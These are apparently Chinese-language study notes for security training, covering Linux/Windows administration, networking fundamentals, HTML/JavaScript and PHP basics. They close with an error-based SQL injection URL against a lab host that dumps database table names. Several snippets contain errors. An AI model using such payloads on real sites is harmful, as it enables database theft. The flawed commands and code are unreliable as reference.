# 操作系统安全

#### 1.VMware的nat,bridged(桥接),和仅主机模式的区别:

```
1.nat(网络地址转换):虚拟机通过宿主机的ip访问外部网络,虚拟机于宿主机共享一个ip地址,但由各自的私有ip.适用于虚拟机需要访问外部网络,但外部网络不能访问虚拟机的情况.
2.bridged(桥接模式):虚拟机与宿主机处于同一个网络中,虚拟机获取一个与宿主机相同网络的IP地址.适用于虚拟机需要与外部网络或者其他计算机直接通信的场景.
3.仅主机模式:虚拟机只能与宿主机进行通信,不可以访问外部网络,也没有外部网络对虚拟机的访问.适用于虚拟机仅需要与宿主机交互的场景.
```

#### 2.用户与权限管理

- 创建和管理用户和用户组:

``` 
Linux:
创建用户:useradd username
修改用户:usermod -options username
删除用户:userdel username
创建用户组:groupadd groupname
将用户添加到组:usermod -a -G groupname username
```

```
Windows:
创建用户:net user username /add
修改用户:net username 2493770457 334455lm
删除用户:net user username /delete
创建用户组:net localgroup groupname /add
将用户添加到组:net localgroup groupname username /add
```

- 影子账户

```
影子账户指在/etc/shadow文件中存储用户密码的加密信息的用户.
它用来增强系统的安全性,将用户密码信息与其他用户信息分开存储,减少泄露的风险
```

- 设置用户密码策略

```
linux:通过passwd命令和/etc/login.defs文件配置密码策略.例如设置密码过期时间
chage -M 90 username

windows:适用本地安全组策略编辑器设置密码策略(如最小密码长度,密码复杂性等)
```

- /etc/passwd和/etc/shadow文件的作用

```
/etc/passwd:存储系统用户的基本信息,如用户名,id,默认组,用户描述,主目录和默认shell

/etc/shadow:存储用户的加密密码及密码过期日期
```

- 使用组策略管理用户权限Windows:

```
打开组策略编辑器(gpedit.msc),在计算机配置或用户配置中设置权限策略,例如用户权限分配,审核策略等
```

- sudo命令的用法和配置

```
用法:sudo以超级用户权限执行指定命令
配置:通过编辑etc/sudoers文件来管理权限,使用visudo命令进行编辑
```

- 使用Windows用户管理工具实现权限分配

```
使用计算机管理中的本地用户和组进行用户和组的管理,设置用户权限和组策略
```

- 最小权限原则及应用

```
最小权限原则要求用户和程序仅获得完成任务所需的最低权限,定期审查权限设置等.
```

- 查看用户登录历史linux

```
使用last命令查看用户的登录历史记录,lastlog查看每一个用户最后一次登录的时间
```

- 在windows中重置密码

```
使用计算机管理中的本地用户和组,选择用户账户,然后重置密码.也可以使用net user
username password newpassword命令
```

#### 3.文件系统

- 查看和管理文件系统的权限

```
linux:
使用ls -l查看权限,使用chmod修改权限

windows:
右键点击文件/文件夹,选择属性,在安全标签总查看和修改权限
```

- 在linux中创建,复制和移动文件

```
创建文件:touch filename
复制文件:cp source destination
移动文件:mv source destination
```

- 在windows中设置文件和文件夹的共享权限

```
右键点击文件/文件夹,选择属性,在共享标签中设置共享权限
```

- linux文件系统的挂载点

```
挂载点是将一个文件系统挂载到系统的一个目录,使其能够作为系统中的一部分访问,例如,使用mout /dev/sdX /mnt/point将设备挂载到目录
```

- 检查linux中磁盘的使用情况

```
使用df -h 命令查看磁盘空间使用情况,使用du -sh diretctory查看目录的磁盘使用情况
```

- windows文件系统中的NTFS特性

```
NTFS(新技术文件系统)支持文件和目录权限,加密,磁盘配额,日志记录,硬链接等功能
```

- 在linux中使用find命令查找文件

```
示例:find /path/to/search -name 'filename'
```

- 文件系统的备份和恢复策略

```
备份策略:定期备份,增量备份,全量备份
恢复策略:确保备份可用,测试恢复过程,制定灾难恢复计划
```

- 在linux中更改文件的所有者和权限

```
更改所有者:chown owner:group filename
更改权限:chmod permissions filename
```

- 软连接和硬链接

```
软链接(符号链接):指向文件或者目录路径,可以跨文件系统,删除源文件后,软链接就会失效
硬链接:指向文件的实际数据块,不能跨文件系统,删除源文件后,硬链接任然有效
```

#### 4.进程与服务

- 进程的定义和管理

```
进程:正在运行的程序实例
linux:使用ps,top,htop等命令查看和管理进程,使用kill命令终止进程
windows:使用任务管理器或者tasklist,taskkill命令查看和管理进程
```

- 部署lamp环境

```
lamp:linux,apache,mysql,php
主要组成部分:linux操作系统,apache服务器,mysql数据库,php脚本语言
```

- linux中的进程优先及调整

```
使用nice命令启动进程时设置优先级,使用renice命令调整正在运行进程的优先级
```

- windows服务的自动启动和手动启动

```
services.msc
sc config 'service_name' start=auto
sc config 'service_name' start=demand
```

- 解释什么是守护进程,给出一个常见的例子

```
守护进程就是在后台进行的进程,通常不与用户直接进行交互,例如,cron是一个常见的守护进程,用于定时任务调度
```

- 使用ps和top命令监控linux进程

```
ps:显示当前进程状态,ps aux显示所有进程
top:实时显示系统进程的资源占用情况
```

- 使用systemctl管理linux服务

```
启动服务:systemctl start service_name
停止服务:systemctl stop service_name
重启服务:systemctl restart service_name
查看服务状态:systemctl status service_name
```

- 查看服务的启动类型

```
在服务中查看和修改服务的启动类型
sc qc name
```

- 进程间通信

```
ipc允许不同进程之间交换数据.常见方式包括管道,消息队列,共享内存,信号量
```

- 在linux中终止一个进程

```
使用kill pid 命令终止指定进程,kill -9 pid强制终止进程
```

- 防火墙配置

```
linux:
iptables -a input -p tcp --dport 22 -j accept允许ssh连接

windows:
netsh advfirewall firewall add name
netsh advfirewall firewall delete name
```

#### 5.windows和linux常用命令

- 文件和目录管理

```
windows:dir,cd,mkdir,rmdir,del,copy,move
linux:ls,cd,mkdir,rmdir,rm,cp,mv
```

- 用户和权限管理

```
windows:net user,net localgroup,whoami,icacls
linux:useradd,usermod,userdel,passwd,chmod,chown
```

- 系统信息和监控

```
windows:systeinfo,tasklist,tasklist,ipconfig,get-process
linux:uname,top,ps,kill,ifconfig或ip
```

- 网络管理

```
windows:ping,tracert,netstat,nslookup
linux:ping,traceroute,netstat,dig
```

- 文件和文本处理

```
windows:type,find,more
linux:cat,grep,less,head,tail
```

- 程序包和管理

```
windows:choco,winget
linux:apt-get,yum,dnf,pacman
```

- 系统操作和版本

```
windows:shutdown,taskschd.msc,powershell
linux:shutdown,cron,bash
```

# 网络协议安全

#### 1.网络基础

- osi七层模型的每一层及功能

```
物理层:传输原始比特流
数据链路层:提供错误检测和纠正,负责帧的传输
网络层:负责数据包的路由和转发,处理逻辑地址
传输层:提供端到端的通信,确保数据的完整性和顺序
会话层:管理会话和对话,提供同步
表示层:数据格式转换和加密解密
```

- dhcp的工作原理

```
作用:动态分配ip地址和网路配置给客户端设备
工作原理:客户端广播dhcp请求,dhcp服务器响应并分配ip地址,客户端确认并接受配置
```

- ip地址的分类和子网掩码的作用

```
分类:A,B.C,D,E
子网掩码:用于ip地址划分为网络部分和主机部分,确定网络的大小和范围
```

- nat网络地址转换

```
功能:将内网的私有ip地址转换成公共ip地址,从而共享互联网连接并隐藏内部网络结构
```

- vpn(虚拟专用网络)的工作原理

```
工作原理:通过加密的隧道连接不同网络,保护数据在不安全网络上的传输,确保数据的安全和隐私
```

- 广播,单播和组播的区别

```
广播:数据包发送到网络上的所有设备
单播:数据包发送到指定的单一设备
组播:数据包发送到一组设备,并非所有设备
```

- icmp协议的作用和用途

```
作用:用于网络设备间的控制消息和错误报告
用途:常用于诊断网络问题(如ping命令)
```

- 在linux中配置静态ip地址

```
编辑网络配置文件(如/etc/network/interfaces或者使用nmcli工具)配置静态ip地址
```

- vlan(虚拟局域网)及配置

```
vlan:在同一物理网络中创建逻辑分隔的网络
配置:在交换机上配置vlan id 和端口
```

#### 2.交换机和路由器

- 交换机和路由器的区别

```
交换机:工作在数据链路层,处理局域网内部的数据帧
路由器:工作在网络层,处理不同网络间的数据包转发
```

- 静态路由和动态路由的工作原理

```
静态路由:手动配置的固定路由
动态路由:使用路由协议(如rip,ospf)自动调整路由
```

- vlan的优势

```
提高网络的安全性,可管理性和性能
通过逻辑分割网络,减少广播域
```

- 链路聚合

```
概念:将多个物理链路聚合成一个逻辑链路,以提高带宽和冗余
使用场景:用于负载均衡的链路备份
```

- 路由器的基本工作流程

```
就收数据包,查找路由表,转发数据包到下一跳或目的地
```

- rip和ospf协议

```
rip:路由信息协议,基于跳数的距离矢量路由协议
ospf:开放最短路径优先,基于链路状态的路由协议,适用于大型网络
```

- 交换机的工作原理

```
根据mac地址表转发的数据帧,提高局域网的效率和带宽利用率
```

- 在路由器上配置nat

```
使用命令:(如ip nat inside source list access-list interface interface overload)配置nat规则
```

#### 3.数据传输

- arp协议的功能及工作原理

```
功能:将ip地址解析为mac地址
工作原理:发送arp请求,目标主机回复arp响应
```

- tcp和udp协议的区别以及适用场景

```
tcp:面向连接,可靠,适用于需要数据完整性和顺序的应用(如http,ftp)
udp:无连接,不可靠,适用实时传输和对丢包不敏感的应用(如voip)
```

- icmp协议的主要用途

```
主要用于网络之间的错误报告和诊断(如ping和traceroute)
```

- 数据包的三次握手

```
第一次:客户端发送SYN包
第二次:服务器回应SYN-ACK包
第三次:客户端发送ACK包建立连接
```

- tcp的流量控制机制

```
使用华东窗口机制控制数据传输速度,确保接收端能够处理发送的数据
```

# 前端基础

#### html

- html5和html4的主要区别

```
html5支持更多的新元素和api改进了多媒体支持,语义化标记,表单控件
```

- 表单元素收集用户输入的实例

```html
<form action='/submit' method='post'>
	<label for='name'>name:</label>
	<input type='text' id='name' name='name'>
	<input type='submit' value='submit'>
</form>
```

- 语义化html:使用具有明确意义的html标签(如<header>,<footer>,<article>),增强文档的可读性
- 优化网页的SEO:使用<meta>标签提供页面的描述,关键字等信息

```html
<meta name='description' content='展示案例'>
<meta name='keywords' content='	SEO'>
```

- html5的存储机制:

```
localstorqage:在客户端存储键值对数据,数据持久保存
sessionstorage:在客户端存储数据,数据在会话结束时清楚
```

- 响应式设计:使用css媒体查询根据设备大小调整布局
- 使用video元素

```html
<video width='320' height='240' controls>
	<source src='movie.MP4' type='video/mp4'>
	</video>
```

#### javascript

- 作用域和闭包的概念

```
作用域:变量的可访问范围
闭包:函数和其词法环境组合,允许函数访问外部函数的变量
```

- 表单验证实例

```js
document.querySelector('form').addEventListener('submit',function(e)){
	var name=document.getElementById('name').value;
	if(name===''){
		alert('名字不为空!');
		e.preventDefault();
	}
});
```

- 变量声明方式

```
var:函数作用域,允许变量提升
let:块级作用域,不允许变量提升
const:块级作用域,不允许重新赋值
```

- 判断变量的数据类型

```
typeof variable;
```

- 函数的调用方法

```
直接调用
使用apply或者call
作为构造函数调用
```

- 处理事件

```
使用事件监听器(addEventListener)
document.getElementByID('button').addEventListener('click',function(){
	alert("按钮点击!");
});
```



# 后端基础

#### 1.php基础

- 超全局变量的作用及常见类型:

```
作用:提供全局访问变量,包含请求数据,会话信息等.
常见类型:$_GET,$_POST,$_SESSION,$_COOKIE,$_SERVER
```

- 处理文件上传:

```
使用$_FILES超全局变量处理文件上传
```

- 创建类和对象

```
class Person{
	public $name;
	public function __construct($name){
		$this->name=$name;
	}
}
$person=new Person('john')
```

- 错误处理机制

```
使用try-catch语句处理异常
```

- 文件写入和读取

```
%file=fopen('1.txt','w');
fwrite($file,'你好!');
fclose($file);
```

- 处理表单数据

```
通过$_POST和$_GET访问表单数据
```

- php常见数据类型

```
整形,浮点型,字符串,数组,对象,布尔,空值
```

- 函数内部访问全局变量

```
使用global关键字
$globalVAR='hello';
function test(){
	global $globalVAR;
	echo $globalVAR;
}
```

- 数据库操作

```
php操作mysql数据库的函数
mysqli_connect:建立连接
mysqli_query:执行查询
mysqli_fetch_assoc:获取结果集中的一行
mysqli_close:关闭数据库
```



- 会话管理

```
cookie和session的区别:Cookie存储在客户端,适用于简单的状态保存;session存储在服务器端,适用于复杂的数据库存储

管理用户会话的权限:适用会话变量存储用户权限信息,并在每次请求中检查

实现用户的登录和注册功能:适用表单提交数据,存储在数据库中,验证用户凭证

维护用户的登录状态:适用会话变量存储用户登录状态
```

- 设置cookie过期时间

```
setcookie('name','value',time()+3600); //1小时后过期
```

- 存储用户信息

```
在会话变量中存储用户数据,$_SESSION['user']=$user;
```

- 实现基于角色的访问控制

```
根据用户在会话中控制访问权限,并在页面或功能中进行权限检查
```



------

```
http://192.168.77.131/master/Less-1/?id=1'and extractvalue(1,concat0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=datatbase()),0x3a) --
```



























































































































































































